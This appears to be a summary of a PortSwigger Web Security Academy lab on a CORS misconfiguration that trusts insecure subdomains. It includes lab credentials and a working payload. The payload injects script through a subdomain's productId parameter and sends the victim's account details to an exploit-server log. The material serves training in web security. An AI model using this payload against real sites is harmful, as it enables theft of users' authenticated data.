## CORS vulnerability with trusted insecure protocols

**Category:** cors
**Difficulty:** Unknown

### Description
This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

### Solution Steps
If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

### Key Payloads
- `wiener:peter`
- `/accountDetails`
- `Access-Control-Allow-Credentials`
- `Origin: http://subdomain.lab-id`
- `lab-id`
- `Access-Control-Allow-Origin`
- `productID`
- `YOUR-LAB-ID`
- `YOUR-EXPLOIT-SERVER-ID`
- `<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: cors

---
*Source: PortSwigger Web Security Academy*
